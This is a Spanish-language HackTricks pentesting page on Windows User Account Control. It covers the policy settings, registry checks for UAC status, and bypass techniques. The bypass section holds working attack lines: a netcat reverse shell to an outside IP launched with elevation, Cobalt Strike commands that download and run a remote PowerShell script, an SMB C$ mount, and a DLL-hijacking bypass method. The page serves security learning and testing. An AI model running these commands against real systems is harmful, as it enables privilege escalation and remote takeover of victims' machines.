# UAC - Control de Cuenta de Usuario

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
¡Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Control de Cuenta de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita una **solicitud de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integridad`, y un programa con un **alto nivel** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre se ejecutan bajo el contexto de seguridad de una cuenta de no administrador a menos que un administrador autorice explícitamente a estas aplicaciones/tareas a tener acceso de nivel de administrador para ejecutarse. Es una característica de conveniencia que protege a los administradores de cambios no deseados, pero no se considera un límite de seguridad.

Para obtener más información sobre los niveles de integridad:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Cuando UAC está en su lugar, a un usuario administrador se le otorgan 2 tokens: una clave de usuario estándar, para realizar acciones regulares a nivel estándar, y una con los privilegios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) analiza en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden utilizar políticas de seguridad para configurar cómo funciona UAC específicamente para su organización a nivel local (usando secpol.msc), o configuradas y desplegadas a través de Objetos de Directiva de Grupo (GPO) en un entorno de dominio de Active Directory. Los diversos ajustes se discuten en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 ajustes de Directiva de Grupo que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:

| Ajuste de Directiva de Grupo                                                                                                                                                                                                                                                                                                                                                     | Clave del Registro          | Configuración predeterminada                                   |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Control de Cuenta de Usuario: Modo de aprobación de administrador para la cuenta de Administrador integrada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deshabilitado                                                     |
| [Control de Cuenta de Usuario: Permitir que las aplicaciones de UIAccess soliciten elevación sin usar el escritorio seguro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deshabilitado                                                     |
| [Control de Cuenta de Usuario: Comportamiento de la solicitud de elevación para administradores en Modo de aprobación de administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimiento para binarios no Windows                  |
| [Control de Cuenta de Usuario: Comportamiento de la solicitud de elevación para usuarios estándar](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciales en el escritorio seguro                 |
| [Control de Cuenta de Usuario: Detectar instalaciones de aplicaciones y solicitar elevación](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (predeterminado para el hogar) Deshabilitado (predeterminado para la empresa) |
| [Control de Cuenta de Usuario: Solo elevar ejecutables que estén firmados y validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deshabilitado                                                     |
| [Control de Cuenta de Usuario: Solo elevar aplicaciones de UIAccess que estén instaladas en ubicaciones seguras](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                      |
| [Control de Cuenta de Usuario: Ejecutar a todos los administradores en Modo de aprobación de administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                      |
| [Control de Cuenta de Usuario: Cambiar al escritorio seguro al solicitar elevación](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                      |
| [Control de Cuenta de Usuario: Virtualizar fallos de escritura de archivos y registro en ubicaciones por usuario](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                      |
### Teoría del Bypass de UAC

Algunos programas se **autoelevan automáticamente** si el **usuario pertenece** al **grupo de administradores**. Estos binarios tienen dentro de sus _**Manifiestos**_ la opción _**autoElevate**_ con el valor _**True**_. El binario también tiene que estar **firmado por Microsoft**.

Entonces, para **burlar** el **UAC** (elevar de un nivel de integridad **medio** a **alto**), algunos atacantes utilizan este tipo de binarios para **ejecutar código arbitrario** porque se ejecutará desde un **proceso de alto nivel de integridad**.

Puedes **verificar** el _**Manifiesto**_ de un binario utilizando la herramienta _**sigcheck.exe**_ de Sysinternals. Y puedes **ver** el **nivel de integridad** de los procesos utilizando _Process Explorer_ o _Process Monitor_ (de Sysinternals).

### Verificar UAC

Para confirmar si UAC está habilitado, haz lo siguiente:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si es **`1`**, entonces UAC está **activado**, si es **`0`** o **no existe**, entonces UAC está **inactivo**.

Luego, verifica **qué nivel** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Si **`0`** entonces, UAC no solicitará permiso (como **deshabilitado**)
* Si **`1`** se le pedirá al administrador que ingrese nombre de usuario y contraseña para ejecutar el binario con altos privilegios (en Escritorio Seguro)
* Si **`2`** (**Siempre notificarme**) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con altos privilegios (en Escritorio Seguro)
* Si **`3`** como `1` pero no es necesario en Escritorio Seguro
* Si **`4`** como `2` pero no es necesario en Escritorio Seguro
* Si **`5`** (**predeterminado**) pedirá al administrador confirmar la ejecución de binarios no Windows con altos privilegios

Luego, debes revisar el valor de **`LocalAccountTokenFilterPolicy`**\
Si el valor es **`0`**, entonces solo el usuario **RID 500** (**Administrador integrado**) puede realizar **tareas de administrador sin UAC**, y si es `1`, **todas las cuentas dentro del grupo "Administradores"** pueden hacerlo.

Y, finalmente, revisa el valor de la clave **`FilterAdministratorToken`**\
Si es **`0`** (predeterminado), la **cuenta de Administrador integrado puede** realizar tareas de administración remota y si es **`1`** la cuenta integrada de Administrador **no puede** realizar tareas de administración remota, a menos que `LocalAccountTokenFilterPolicy` esté configurado en `1`.

#### Resumen

* Si `EnableLUA=0` o **no existe**, **ningún UAC para nadie**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=1`, ningún UAC para nadie**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=0`, ningún UAC para RID 500 (Administrador integrado)**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=1`, UAC para todos**

Toda esta información se puede obtener utilizando el módulo de **metasploit**: `post/windows/gather/win_privs`

También puedes verificar los grupos de tu usuario y obtener el nivel de integridad:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass de UAC

{% hint style="info" %}
Ten en cuenta que si tienes acceso gráfico a la víctima, el bypass de UAC es directo, ya que simplemente puedes hacer clic en "Sí" cuando aparezca el aviso de UAC.
{% endhint %}

El bypass de UAC es necesario en la siguiente situación: **el UAC está activado, tu proceso se está ejecutando en un contexto de integridad media y tu usuario pertenece al grupo de administradores**.

Es importante mencionar que es **mucho más difícil evadir el UAC si está en el nivel de seguridad más alto (Siempre) que si está en cualquiera de los otros niveles (Predeterminado)**.

### UAC deshabilitado

Si el UAC ya está deshabilitado (`ConsentPromptBehaviorAdmin` es **`0`**), puedes **ejecutar un shell inverso con privilegios de administrador** (nivel de integridad alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass de UAC con duplicación de token

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** básico "bypass" de UAC (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que está dentro del grupo de Administradores, puedes **montar el recurso compartido C$** a través de SMB (sistema de archivos) localmente en un nuevo disco y tendrás **acceso a todo dentro del sistema de archivos** (incluso la carpeta de inicio del Administrador).

{% hint style="warning" %}
**Parece que este truco ya no funciona**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass de UAC con cobalt strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **burlar** el **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass de UAC

[**UACME**](https://github.com/hfiref0x/UACME) es una **compilación** de varios exploits de bypass de UAC. Ten en cuenta que necesitarás **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitarás saber **cuál necesitas**.\
Debes **tener cuidado** porque algunos bypasses **pueden provocar que otros programas** alerten al **usuario** de que algo está sucediendo.

UACME tiene la **versión de compilación desde la cual cada técnica comenzó a funcionar**. Puedes buscar una técnica que afecte a tus versiones:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Además, utilizando [esta](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) página puedes obtener la versión de Windows `1607` a partir de las versiones de compilación.

#### Más bypass de UAC

**Todas** las técnicas utilizadas aquí para evadir el UAC **requieren** una **shell interactiva completa** con la víctima (una shell nc.exe común no es suficiente).

Puedes obtener una sesión de **meterpreter**. Migra a un **proceso** que tenga el valor de **Sesión** igual a **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ debería funcionar)

### Bypass de UAC con GUI

Si tienes acceso a una **GUI, simplemente puedes aceptar la ventana emergente de UAC** cuando aparezca, realmente no necesitas evadirlo. Por lo tanto, tener acceso a una GUI te permitirá evadir el UAC.

Además, si obtienes una sesión de GUI que alguien estaba usando (potencialmente a través de RDP), hay **algunas herramientas que se ejecutarán como administrador** desde donde podrías **ejecutar** un **cmd** por ejemplo **como administrador** directamente sin que aparezca nuevamente la ventana de UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **sigiloso**.

### Bypass de UAC de fuerza bruta ruidoso

Si no te importa ser ruidoso, siempre puedes **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **solicita elevar permisos hasta que el usuario lo acepte**.

### Tu propio bypass - Metodología básica de bypass de UAC

Si echas un vistazo a **UACME** notarás que **la mayoría de los bypass de UAC abusan de una vulnerabilidad de secuestro de Dll** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de secuestro de Dll](../windows-local-privilege-escalation/dll-hijacking.md).

1. Encuentra un binario que se **autoeleve** (verifica que cuando se ejecute lo haga en un nivel de integridad alto).
2. Con procmon, encuentra eventos de "**NOMBRE NO ENCONTRADO**" que puedan ser vulnerables al **Secuestro de DLL**.
3. Probablemente necesitarás **escribir** la DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32) donde no tengas permisos de escritura. Puedes evadir esto usando:
1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de rutas protegidas (porque esta herramienta se ejecuta desde un nivel de integridad alto).
2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro de la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de bypass de UAC

Consiste en observar si un **binario autoelevado** intenta **leer** del **registro** el **nombre/ruta** de un **binario** o **comando** a ser **ejecutado** (esto es más interesante si el binario busca esta información dentro del **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** impulsados por las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking de AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
